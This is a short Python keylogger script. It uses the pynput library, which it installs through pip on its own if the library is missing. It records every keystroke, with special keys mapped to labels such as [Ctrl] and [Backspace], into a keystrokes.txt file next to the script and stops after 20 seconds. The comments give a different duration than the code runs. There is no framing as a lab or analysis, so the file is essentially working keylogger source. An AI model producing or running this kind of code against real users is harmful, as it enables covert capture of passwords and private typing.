import os
import threading
import time

# Function to install a package using pip
def install_package(package):
    import subprocess
    import sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Check if pynput is installed, and install it if necessary
try:
    import pynput
except ImportError:
    print("pynput is not installed. Installing...")
    install_package("pynput")
    import pynput

from pynput.keyboard import Key, Listener
from pynput.keyboard import KeyCode

# Dictionary mapping special keys to their representations
special_keys = {
    Key.space: " ",
    Key.ctrl_l: "[Ctrl]",
    Key.ctrl_r: "[Ctrl]",
    Key.alt_l: "[Alt]",
    Key.alt_r: "[Alt]",
    Key.shift: "[Shift]",
    Key.tab: "[Tab]",
    Key.enter: "\n",
    Key.caps_lock: "[CapsLock]",
    Key.num_lock: "[NumLock]",
    Key.backspace: "[Backspace]",
    Key.delete: "[Delete]",
    Key.up: "[Up]",
    Key.down: "[Down]",
    Key.left: "[Left]",
    Key.right: "[Right]",
    Key.insert: "[Insert]",
    Key.home: "[Home]",
    Key.end: "[End]",
    Key.page_up: "[PageUp]",
    Key.page_down: "[PageDown]",
    Key.f1: "[F1]",
    Key.f2: "[F2]",
    Key.f3: "[F3]",
    Key.f4: "[F4]",
    Key.f5: "[F5]",
    Key.f6: "[F6]",
    Key.f7: "[F7]",
    Key.f8: "[F8]",
    Key.f9: "[F9]",
    Key.f10: "[F10]",
    Key.f11: "[F11]",
    Key.f12: "[F12]",
    Key.print_screen: "[PrintScreen]",
    Key.scroll_lock: "[ScrollLock]",
    Key.pause: "[Pause]",
    Key.menu: "[Menu]",
    # Number pad keys
    KeyCode.from_vk(96): "0",  # Numpad 0
    KeyCode.from_vk(97): "1",  # Numpad 1
    KeyCode.from_vk(98): "2",  # Numpad 2
    KeyCode.from_vk(99): "3",  # Numpad 3
    KeyCode.from_vk(100): "4", # Numpad 4
    KeyCode.from_vk(101): "5", # Numpad 5
    KeyCode.from_vk(102): "6", # Numpad 6
    KeyCode.from_vk(103): "7", # Numpad 7
    KeyCode.from_vk(104): "8", # Numpad 8
    KeyCode.from_vk(105): "9", # Numpad 9
    KeyCode.from_vk(110): ".", # Numpad decimal
    KeyCode.from_vk(107): "+", # Numpad add
    KeyCode.from_vk(109): "-", # Numpad subtract
    KeyCode.from_vk(106): "*", # Numpad multiply
    KeyCode.from_vk(111): "/", # Numpad divide
    KeyCode.from_vk(13): "\n"  # Enter key
}

def create_note_file():
    # Get the directory of the script
    script_dir = os.path.dirname(os.path.realpath(__file__))
    # Create the note file in the same directory
    note_file = os.path.join(script_dir, "keystrokes.txt")
    # Create the note file if it doesn't exist
    if not os.path.exists(note_file):
        with open(note_file, "w"):
            pass
    return note_file

def on_press(key):
    try:
        # Convert the key to string
        key_str = str(key.char)
    except AttributeError:
        # Check if it's a special key
        if key in special_keys:
            key_str = special_keys[key]
        else:
            key_str = str(key)

    # Save the key to the note file
    with open(note_file, "a") as file:
        file.write(key_str)

def key_listener():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    note_file = create_note_file()

    listener_thread = threading.Thread(target=key_listener)
    listener_thread.daemon = True
    listener_thread.start()

    # Terminate the script after 10 seconds
    # 600 seconds = 10 minutes
    time.sleep(20)

    print("\nExiting...")
